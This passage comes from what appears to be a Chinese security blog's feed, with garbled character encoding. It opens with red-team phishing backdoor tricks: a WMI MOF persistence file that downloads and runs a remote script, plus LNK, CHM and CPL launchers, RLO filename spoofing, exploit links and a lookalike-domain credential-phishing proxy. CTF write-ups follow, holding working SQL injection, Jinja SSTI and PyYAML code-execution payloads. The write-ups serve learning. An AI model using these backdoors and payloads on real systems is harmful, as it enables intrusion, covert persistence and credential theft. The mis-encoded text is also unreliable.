id="mof-è°ƒç”¨-javascript-backdoor"><a href="#mof-è°ƒç”¨-javascript-backdoor" class="headerlink" title="mof è°ƒç”¨ javascript_backdoor"></a>mof è°ƒç”¨ javascript_backdoor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma namespace(&quot;\\\\.\\root\\subscription&quot;)    </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">    Name  = &quot;filtP1&quot;;</span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">            &quot;And TargetInstance.Second = 1&quot;;</span><br><span class="line">    QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;    </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">    Name = &quot;consP1&quot;;</span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">    ScriptText = &quot;GetObject(\&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test\&quot;)&quot;;</span><br><span class="line">&#125;;    </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = $Consumer;</span><br><span class="line">    Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç±»ä¼¼çš„ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨wmiæ‰§è¡Œå…¶ä»–åé—¨ç¨‹åºï¼Œé…åˆä½¿ç”¨</p><p>å…·ä½“çš„å¯ä»¥çœ‹è¿™ç¯‡<br><a href="http://www.anquan.us/static/drops/tips-8260.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/tips-8260.html</a></p><p>åŒæ—¶wmiä¹Ÿå¯ä½¿ç”¨ </p><blockquote><p>vbs<br>mof<br>C / C++<br>.Net<br>ç­‰æ–¹å¼è¿›è¡Œæ‰§è¡Œ </p></blockquote><h2 id="0x05-Lnk-Backdoor"><a href="#0x05-Lnk-Backdoor" class="headerlink" title="0x05 Lnk Backdoor"></a>0x05 Lnk Backdoor</h2><p>å¯å‚è€ƒevi1cgå¸ˆå‚…çš„æ–‡ç« -&gt;<a href="https://evi1cg.me/archives/Shortcut_Backdoor.html" target="_blank" rel="noopener">Shortcut_Backdoor</a><br>å¿«æ·æ–¹å¼ä¼šæ‰§è¡Œç›®æ ‡é‡Œçš„æ–‡ä»¶<br><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/7092550A-0CF0-42AE-96C7-E41A769063B2.png" alt="e6661303d9cae03727399d7ada045593"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shortcut_gen.exe test.txt test.lnk</span><br></pre></td></tr></table></figure><p>è¿™æ ·ç‚¹å‡»test.lnk å°±ä¼šæ‰§è¡Œtest.txtä¸­çš„å‘½ä»¤</p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨evi1cgå¸ˆå‚…çš„è„šæœ¬-&gt;<a href="https://gist.github.com/Ridter/a360f94d8ac9a8c30227e3812dfbb329" target="_blank" rel="noopener">https://gist.github.com/Ridter/a360f94d8ac9a8c30227e3812dfbb329</a></p><h2 id="0x06-Chm-Backdoor"><a href="#0x06-Chm-Backdoor" class="headerlink" title="0x06 Chm Backdoor"></a>0x06 Chm Backdoor</h2><p>é€šç”¨ä»¥ä¸Š #åˆ©ç”¨ CHM åŠ è½½ JS<br>ä¸å•å¯åˆ©ç”¨JSè¿›è¡Œæ‰§è¡Œ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class="line">command exec </span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Item1&quot; value=&apos;,calc.exe&apos;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>åˆ©ç”¨Objectæ ‡ç­¾ï¼Œå¯æ‰§è¡Œå„ç±»shellcode<br>æ¯”å¦‚åˆ©ç”¨regsvr32 æ‰§è¡Œdllï¼Œåˆ©ç”¨mshtaæ‰§è¡Œhtaï¼Œç›´æ¥è¿è¡Œpowershellï¼ŒVBSç­‰ç­‰<br>å‰æå½“ç„¶æ˜¯åšå¥½æ··æ·†å’Œå…æ€</p><h2 id="0x07-CPL-Backdoor"><a href="#0x07-CPL-Backdoor" class="headerlink" title="0x07 CPL Backdoor"></a>0x07 CPL Backdoor</h2><p>CPL (Control Panel Item)<br>CPLæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯DLLï¼Œ ä½†æ˜¯ç”±äºä»–åŒ…å«CPLAppletå‡½æ•°ï¼Œæ‰€ä»¥æˆä¸ºäº†ä¸€ä¸ªwindowså¯æ‰§è¡Œæ–‡ä»¶<br>ä½†æ˜¯è™½ç„¶æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå…¶å®æ˜¯è°ƒç”¨shell32.dll æ¥è¿è¡Œ<br>è°ƒç”¨çš„å‡ ç§æ–¹å¼:</p><p><strong>åˆ©ç”¨vbsè°ƒç”¨cpl</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dim obj</span><br><span class="line">Set obj = CreateObject(&quot;Shell.Application&quot;)</span><br><span class="line">obj.ControlPanelItem(&quot;test.cpl&quot;)</span><br></pre></td></tr></table></figure></p><p><strong>åˆ©ç”¨jsè°ƒç”¨cpl</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a = new ActiveXObject(&quot;Shell.Application&quot;);</span><br><span class="line">a.ControlPanelItem(&quot;c:\\test\\test.cpl&quot;);</span><br></pre></td></tr></table></figure></p><p>åŒæ ·ï¼Œå…¶å®å¯ä»¥ç›´æ¥ç”¨msfç”Ÿæˆä¸€ä¸ªdllæ–‡ä»¶ï¼Œç„¶åä¿®æ”¹åç¼€ä¸º.cplå³å¯ï¼Œä½†æ˜¯å­˜åœ¨ä¸€ä¸ªå¼¹çª—æç¤ºç¨‹åºå…¼å®¹æ€§é—®é¢˜<br>è§£å†³æ–¹å¼ï¼šæ‰‹åŠ¨ç¼–è¯‘reverse_tcp</p><p>å‚è€ƒï¼š<a href="http://www.anquan.us/static/drops/tips-16042.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/tips-16042.html</a></p><h2 id="0x08-Windows-åˆ©ç”¨Unicode-æ–‡ä»¶ååè½¬"><a href="#0x08-Windows-åˆ©ç”¨Unicode-æ–‡ä»¶ååè½¬" class="headerlink" title="0x08 Windows åˆ©ç”¨Unicode æ–‡ä»¶ååè½¬"></a>0x08 Windows åˆ©ç”¨Unicode æ–‡ä»¶ååè½¬</h2><p>ç›¸å½“ç®€å•..<br><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/0BB5918F-F0DC-4CED-B0BE-56F421ABA477.png" alt="723d43d4d266bfe5a3c58768d476d090"></p><p>æ’å…¥RLOå­—ç¬¦å°±å¯ä»¥è¿›è¡Œæ–‡ä»¶ååè½¬ï¼Œç„¶åå¯ä»¥æ¢å›¾ç‰‡æ¥æ›´å¥½çš„ä¼ªè£…<br><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/76864B14-46A1-4586-BC1E-2A104295BA7C.png" alt="5633fd5aa8a0e32749abe83665490e9c"></p><h2 id="0x09-Winrar-Backdoor"><a href="#0x09-Winrar-Backdoor" class="headerlink" title="0x09 Winrar Backdoor"></a>0x09 Winrar Backdoor</h2><p>è‘—åçš„<code>CVE-2018-20250</code><br>è¿˜æ²¡åˆ†æè¿‡åŸç†..çŒ®ä¸Šå­¦é•¿çš„Exp<br><a href="https://github.com/WyAtu/CVE-2018-20250" target="_blank" rel="noopener">https://github.com/WyAtu/CVE-2018-20250</a></p><h2 id="0x10-CVE-2018-4878"><a href="#0x10-CVE-2018-4878" class="headerlink" title="0x10 CVE-2018-4878"></a>0x10 CVE-2018-4878</h2><p>å½±å“ç‰ˆæœ¬ï¼š<br><code>version &lt;= 28.0.0.137</code><br>flask æº¢å‡ºï¼Œé…åˆè„šæœ¬è¿›è¡Œæ”»å‡»å°±è¡Œ..ç°åœ¨h5ç››è¡Œï¼Œflashä¹Ÿå¿«é€€ä¼‘äº†</p><h2 id="0x11-Nginx-åå‘ä»£ç†"><a href="#0x11-Nginx-åå‘ä»£ç†" class="headerlink" title="0x11 Nginx åå‘ä»£ç†"></a>0x11 Nginx åå‘ä»£ç†</h2><p>æ¨ä¸€æ³¢passer6y<br><a href="https://www.anquanke.com/post/id/150436" target="_blank" rel="noopener">https://www.anquanke.com/post/id/150436</a><br>å¤§æ¦‚å°±æ˜¯æ³¨å†Œä¸€ä¸ªç›¸è¿‘çš„åŸŸåï¼Œç„¶ååä»£çœŸå®æœåŠ¡å™¨ï¼Œæˆªæ–­æ˜æ–‡å¯†ç ï¼Œè¿›è¡Œé’“é±¼ï¼Œå•ç‹¬åˆ†æä¸€æ³¢  # Nginx åå‘ä»£ç†å®æˆ˜</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-07-18 11:20:33&lt;br&gt;&lt;img src=&quot;/wallpaper/[39567]Good Morning-54191467.png&quot; alt&gt;&lt;br&gt;[toc]&lt;br&gt;é±¼
      
    
    </summary>
    
      <category term="Red-Team Tricks" scheme="http://patrilic.top/categories/Red-Team-Tricks/"/>
    
    
      <category term="Backdoor" scheme="http://patrilic.top/tags/Backdoor/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2019-è¥¿å—èµ›åŒºéƒ¨åˆ†Webé¢˜è§£</title>
    <link href="http://patrilic.top/2019/06/10/CISCN2019-%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%83%A8%E5%88%86Web%E9%A2%98%E8%A7%A3/"/>
    <id>http://patrilic.top/2019/06/10/CISCN2019-è¥¿å—èµ›åŒºéƒ¨åˆ†Webé¢˜è§£/</id>
    <published>2019-06-10T07:08:02.000Z</published>
    <updated>2019-08-20T15:27:04.138Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-06-10 15:08:02<br>æ‹¿äº†ä¸ªç¬¬å››..å¸ˆå‚…ä»¬tqlï¼Œæ²¡æƒ³åˆ°çº¯Webé˜Ÿä¼ä¹Ÿæœ‰ç¿»èº«çš„ä¸€å¤©ï¼ˆæ»‘ç¨½ï¼‰<br><img src="/CISCN2019 -è¥¿å—èµ›åŒºåˆ†åŒºèµ›Webé¢˜è§£.resources/931F982B33E8B1040822716BDAFA42EE.jpg" alt="931f982b33e8b1040822716bdafa42ee"></p></blockquote><h2 id="Ciscn-q07"><a href="#Ciscn-q07" class="headerlink" title="Ciscn-q07"></a>Ciscn-q07</h2><p>å…ˆæ³¨å†Œä¸€ä¸ªadminâ€™# çš„è´¦å·ç„¶åç›´æ¥æ–‡ä»¶ä¸Šä¼ <br>ç›´æ¥ä¼ php(ä¸ç”¨&lt;?php)<br>æ”¹mimeä¸ºimage/jpegå°±getshelläº†..<br><img src="/CISCN2019 -è¥¿å—èµ›åŒºåˆ†åŒºèµ›Webé¢˜è§£.resources/071.png" alt="4d80f49d47825ccd9aca1330a124636c"><br><img src="/CISCN2019 -è¥¿å—èµ›åŒºåˆ†åŒºèµ›Webé¢˜è§£.resources/072.png" alt="913690845a8e92d1ab10a77737894477"></p><p>åˆ¤å®šäº†ä¸€ä¸ªadminçš„æƒé™</p><h2 id="Ciscn-q09"><a href="#Ciscn-q09" class="headerlink" title="Ciscn-q09"></a>Ciscn-q09</h2><p>æ³¨å†Œç”¨æˆ·ç™»é™†çš„æ—¶å€™ï¼Œå‘ç°å­˜åœ¨sqlæ³¨å…¥<br>ç™»é™†è¿›å»ä¹‹åå‘ç°æ³¨é‡Šæœ‰æç¤ºï¼Œå­˜åœ¨adminçš„è´¦å·ï¼Œæ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸ºä¸‹é¢çš„è´¦å·ï¼Œç™»é™†å³å¯æ³¨å…¥adminçš„å¯†ç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&apos;&amp;amp;&amp;amp;Â extractvalue(1,concat(0x7e,(selectÂ `3`Â fromÂ (selectÂ 1,2,3Â unionÂ selectÂ *Â fromÂ user)aÂ limitÂ 1,1)))#</span><br></pre></td></tr></table></figure></p><p><img src="/CISCN2019 -è¥¿å—èµ›åŒºåˆ†åŒºèµ›Webé¢˜è§£.resources/091.png" alt="19cd6150c405f77f4e70098b9a9ff4f7"><br><img src="/CISCN2019 -è¥¿å—èµ›åŒºåˆ†åŒºèµ›Webé¢˜è§£.resources/092.png" alt="f94276c29af45e7fc2928bcbe9248541"><br><img src="/CISCN2019 -è¥¿å—èµ›åŒºåˆ†åŒºèµ›Webé¢˜è§£.resources/093.png" alt="86a8390a6baa79d4ccaa682ae02d91cb"></p><p>ç”¨adminçš„è´¦å·å’Œå¯†ç ç™»é™†æç¤ºorangeçš„SSRFï¼Œå¯æ§urlå°±æ˜¯bugåé¦ˆ</p><p>æºå¸¦cookieå»è¯·æ±‚flag.phpå³å¯è·å¾—flag<br><img src="/CISCN2019 -è¥¿å—èµ›åŒºåˆ†åŒºèµ›Webé¢˜è§£.resources/094.png" alt="9142fc4e44be8a5d61cde6519fdbf26e"></p><h2 id="Ciscn-8"><a href="#Ciscn-8" class="headerlink" title="Ciscn 8"></a>Ciscn 8</h2><p>URLï¼š172.16.9.18<br>çœ‹ç€æœ‰è®¡ç®—åŠŸèƒ½ï¼Œå¹¶ä¸”æ˜¯PYï¼Œç›´æ¥æƒ³SSTIï¼Œè¯•äº†ä¸‹ 2<br>å¾—åˆ°è¾“å‡ºç»“æœä¸º2ï¼Œç¡®å®šäº†SSTI<br><img src="/CISCN2019 -è¥¿å—èµ›åŒºåˆ†åŒºèµ›Webé¢˜è§£.resources/123.png" alt="3a65fa54c411da804acc98652f208834"></p><p>ç„¶åå°±æ˜¯ç”¨payloadäº†ï¼Œä¸è¿‡æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°äº†ä¸¤ä¸ªè¿‡æ»¤çš„ç‚¹ ä¸€ä¸ªæ˜¯æ‹¬å·ï¼Œä¸€ä¸ªæ˜¯openå­—ç¬¦ä¸²ï¼Œä¸è¿‡éƒ½å¯ä»¥ç”¨åŒå†™æ¥ç»•è¿‡ æ‹¬å·åªæ˜¯å•ç‹¬çš„æ‹¬å·å°±ä¼šè¢«ç½®æ¢ä¸ºç©ºï¼Œå¦‚æœé‡Œé¢æœ‰å­—ç¬¦çš„è¯å°±ä¸ä¼šç½®æ¢ä¸ºç©º æ¯”å¦‚ () è¦ç”¨ (()) ç»•ï¼Œ open è¦ç”¨ opopenen ç»•<br>äºæ˜¯æœ€ç»ˆçš„payloadä¸º<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__.__getitem__(1).__subclasses__(())[302].__init__.__globals__[&apos;poopenpen&apos;](&apos;cat flag&apos;).read(())&#125;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/CISCN2019 -è¥¿å—èµ›åŒºåˆ†åŒºèµ›Webé¢˜è§£.resources/111.png" alt="4ef955d4f8a6198ac47c9f39365b480c"><br><img src="/CISCN2019 -è¥¿å—èµ›åŒºåˆ†åŒºèµ›Webé¢˜è§£.resources/112.png" alt="65c4176a3f67c25b3beafaad2432027a"></p><h2 id="Ciscn-10"><a href="#Ciscn-10" class="headerlink" title="Ciscn 10"></a>Ciscn 10</h2><p>URLï¼š 172.16.9.20<br>ç‚¹å‡»å¿˜è®°å¯†ç <br><img src="/CISCN2019 -è¥¿å—èµ›åŒºåˆ†åŒºèµ›Webé¢˜è§£.resources/3.png" alt="454b911c60722c999e150395e4fbcbab"></p><p>ä¿®æ”¹åå¯ç›´æ¥ç™»å½•admin<br><img src="/CISCN2019 -è¥¿å—èµ›åŒºåˆ†åŒºèµ›Webé¢˜è§£.resources/å›¾ç‰‡ 2.png" alt="5ce1c580d29d7c882b2e34f59ff2885f"></p><p>çŒœæµ‹yamlå‘½ä»¤æ‰§è¡Œ<br>æ‰§è¡Œlsç»“æœ<br> Payloadï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!!map &#123;</span><br><span class="line">? !!strÂ &quot;goodbye&quot;</span><br><span class="line">: !!python/object/apply:subprocess.check_output [</span><br><span class="line">!!strÂ &quot;ls&quot;,],&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/CISCN2019 -è¥¿å—èµ›åŒºåˆ†åŒºèµ›Webé¢˜è§£.resources/å›¾ç‰‡ 1.png" alt="1349a5aa45787c9df811b7ae787084f4"></p><p>å‡†å¤‡æ„é€ payload è¿›è¡Œcat /flagæ—¶å‘ç°åˆ«äººä¸Šä¼ äº†5.yml<br>ç›´æ¥è®¿é—®å³å¯ï¼š<br> flag{81595b84-317b-434a-b45f-6aea2c37722c}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-06-10 15:08:02&lt;br&gt;æ‹¿äº†ä¸ªç¬¬å››..å¸ˆå‚…ä»¬tqlï¼Œæ²¡æƒ³åˆ°çº¯Webé˜Ÿä¼ä¹Ÿæœ‰ç¿»èº«çš„ä¸€å¤©ï¼ˆæ»‘ç¨½ï¼‰&lt;br&gt;&lt;img src=&quot;/CISCN2019 -è¥¿å—èµ›åŒºåˆ†åŒºèµ›Webé¢˜è§£.
      
    
    </summary>
    
      <category term="Write-up" scheme="http://patrilic.top/categories/Write-up/"/>
    
    
      <category term="CTF" scheme="http://patrilic.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>QWB2019 Web -éšä¾¿æ³¨ï¼ˆé¢˜è§£ï¼‰</title>
    <link href="http://patrilic.top/2019/06/05/QWB2019%20Web%20-%E9%9A%8F%E4%BE%BF%E6%B3%A8%EF%BC%88%E9%A2%98%E8%A7%A3%EF%BC%89/"/>
    <id>http://patrilic.top/2019/06/05/QWB2019 Web -éšä¾¿æ³¨ï¼ˆé¢˜è§£ï¼‰/</id>
    <published>2019-06-05T12:59:32.000Z</published>
    <updated>2019-08-20T15:28:04.484Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-06-05 20:59:32<br><img src="/wallpaper/[41576]ã€Œã€€ã­ã‡ã€ã€-64710934.jpg" alt><br>å¾ˆå°‘é‡åˆ°ä½¿ç”¨ <strong>mysqli_multi_query()</strong> çš„é¢˜ç›®ï¼Œåšä¸ªè®°å½•</p></blockquote><p>æ¦‚ç‡è®ºä½¿æˆ‘æ†”æ‚´</p><h2 id="0x01-æ€è·¯"><a href="#0x01-æ€è·¯" class="headerlink" title="0x01 æ€è·¯"></a>0x01 æ€è·¯</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œå°±ä¸€ä¸ª&lt;input>æ ‡ç­¾ï¼Œéšä¾¿è¾“ä¸€ä¸ªæ•°å­—ï¼ŒburpæŠ“ä¸€ä¸‹<br><img src="/QWB2019 Web -éšä¾¿æ³¨ï¼ˆé¢˜è§£ï¼‰.resources/225795EF-A32C-497C-967D-C6AED199E73A.png" alt="a9bba15b8d47ba4edea294709f323bc5"></p><p>æ„Ÿè§‰æ˜¯ä¸€èˆ¬çš„selectè¯­å¥<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>, <span class="keyword">data</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> <span class="keyword">id</span> = &#123;$inject&#125;</span><br></pre></td></tr></table></figure></p><p>æµ‹ä¸€ä¸‹è¿‡æ»¤æƒ…å†µ<br>éšä¾¿è¾“å…¥ä¸€ä¸ª<img src="/QWB2019 Web -éšä¾¿æ³¨ï¼ˆé¢˜è§£ï¼‰.resources/893B07F7-8A30-4FBD-923D-3203BF85F508.png" alt="0535bce1ced6095c073ded1c06110095"><br>çˆ†å‡ºè¿‡æ»¤æƒ…å†µ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>, $inject);</span><br></pre></td></tr></table></figure></p><p>å°è¯•ä¸€æ³¢extractvalue(),æ— æœ..</p><p>ç„¶åå°±åœ¨æµ‹è¯•ä¸€äº›å¸¸ç”¨çš„æƒ…å†µï¼Œç±»ä¼¼äº<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((substr(user(),1,1)&gt;'a'),sleep(5),1);</span><br></pre></td></tr></table></figure></p><p>åæ¥@hpdogerå‘Šè¯‰æˆ‘è¯´å¯ä»¥å †å æŸ¥è¯¢..<br>äºæ˜¯ä¹..<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure></p><p><img src="/QWB2019 Web -éšä¾¿æ³¨ï¼ˆé¢˜è§£ï¼‰.resources/C6C08A11-B19B-49EC-AECC-E88D6846C07A.png" alt="e77b6cef87b97ccf9d695c4f36dd2fe2"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span></span><br></pre></td></tr></table></figure><p><img src="/QWB2019 Web -éšä¾¿æ³¨ï¼ˆé¢˜è§£ï¼‰.resources/F4ECA2ED-A838-4A75-BA6B-5ED93136DB3E.png" alt="acde9a6b7ba360dbb9e0404f47a48a1c"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">describe</span><span class="string">`1919810931114514`</span></span><br></pre></td></tr></table></figure><p><img src="/QWB2019 Web -éšä¾¿æ³¨ï¼ˆé¢˜è§£ï¼‰.resources/B102EE66-34F1-4FB9-8098-65E35EB32CA3.png" alt="6bcd5a04abba3759bc0d190a82b550ce"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'version'</span></span><br></pre></td></tr></table></figure><p><img src="/QWB2019 Web -éšä¾¿æ³¨ï¼ˆé¢˜è§£ï¼‰.resources/5F55DDD1-4E28-46C6-8EE2-B3F9C8C8F00A.png" alt="9a2a58383e535d53cc886c3078bfbe33"></p><p>æ‰€ä»¥ç°åœ¨çš„ä¿¡æ¯å°±æ˜¯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">database: supersqli</span><br><span class="line">table: 1919810931114514</span><br><span class="line">column: flag</span><br><span class="line">version: 10.0.27-MariaDB-0ubuntu0.16.04.1</span><br></pre></td></tr></table></figure></p><p>ç„¶åè¿˜æœ‰ä¸ªå¥½ç©çš„ï¼š<br>æŸ¥çœ‹grantçš„æ—¶å€™: ;SHOW GRANTS FOR CURRENT_USER()<br><img src="/QWB2019 Web -éšä¾¿æ³¨ï¼ˆé¢˜è§£ï¼‰.resources/BD7CB99F-9E59-45B0-9AF7-1AE8E74158DC.png" alt="f7c19dd203bc1755b0d46759e09f93c7"></p><p>ç°åœ¨ç›®æ ‡æ˜ç¡®ï¼Œå°±æ˜¯è¦<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> <span class="number">191981093111414</span></span><br></pre></td></tr></table></figure></p><h2 id="æ–¹æ³•1"><a href="#æ–¹æ³•1" class="headerlink" title="æ–¹æ³•1"></a>æ–¹æ³•1</h2><p>åˆ©ç”¨setå°†<strong>select flag from 1919810931114514</strong>å†™å…¥å˜é‡@patrilicä¸­ï¼Œåˆ©ç”¨prepareå°†å˜é‡è®¾ç½®ä¸ºé¢„å¤„ç†ï¼Œç„¶åå†execute</p><p>ä¸»è¦å¯ä»¥bypassæ‰selectï¼Œç”¨char()å‡½æ•°å¸¦å…¥ã€‚<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> @patrilic=<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">32</span>),<span class="number">1919810931114514</span>);</span><br></pre></td></tr></table></figure></p><p><img src="/QWB2019 Web -éšä¾¿æ³¨ï¼ˆé¢˜è§£ï¼‰.resources/868A3AB6-CFD4-4B93-8ACF-7FD92F44A6C6.png" alt="f30557894cf438c4e47146a0cb3bbc45"></p><p>ç„¶åç›´æ¥æ‰§è¡Œå³å¯.<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=&apos;;SET+@patrilic=concat(char(115,101,108,101,99,116,32),char(102,108,97,103,32),char(102,114,111,109,32),char(96),1919810931114514,char(96));prepare+patrilic+from+@patrilic;execute+patrilic%23</span><br></pre></td></tr></table></figure></p><p>å‚è€ƒ:<br><a href="https://blog.csdn.net/qq_42030417/article/details/80372800" target="_blank" rel="noopener">https://blog.csdn.net/qq_42030417/article/details/80372800</a></p><h2 id="æ–¹æ³•2"><a href="#æ–¹æ³•2" class="headerlink" title="æ–¹æ³•2"></a>æ–¹æ³•2</h2><p>åˆ©ç”¨mysql::handler<br><img src="/QWB2019 Web -éšä¾¿æ³¨ï¼ˆé¢˜è§£ï¼‰.resources/44DCE71B-290D-4DF1-BF78-8CA825633D9F.png" alt="078ec36715ece7186ada02a51ac1f367"></p><p>ä¹Ÿå¯ä½¿ç”¨åˆ«å<br><img src="/QWB2019 Web -éšä¾¿æ³¨ï¼ˆé¢˜è§£ï¼‰.resources/6F664750-5A87-498E-9790-42EC62EAE0F3.png" alt="5e65dda79fc38e997716d9f5139dc88a"></p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=&apos;;handler+`1919810931114514`+open;handler`1919810931114514`read+first%23</span><br></pre></td></tr></table></figure></p><p>å‚è€ƒï¼š<br><a href="https://dev.mysql.com/doc/refman/5.7/en/handler.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/handler.html</a><br><a href="https://blog.csdn.net/JesseYoung/article/details/40785137" target="_blank" rel="noopener">https://blog.csdn.net/JesseYoung/article/details/40785137</a></p><h2 id="æ–¹æ³•3"><a href="#æ–¹æ³•3" class="headerlink" title="æ–¹æ³•3"></a>æ–¹æ³•3</h2><p>â€¦ </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
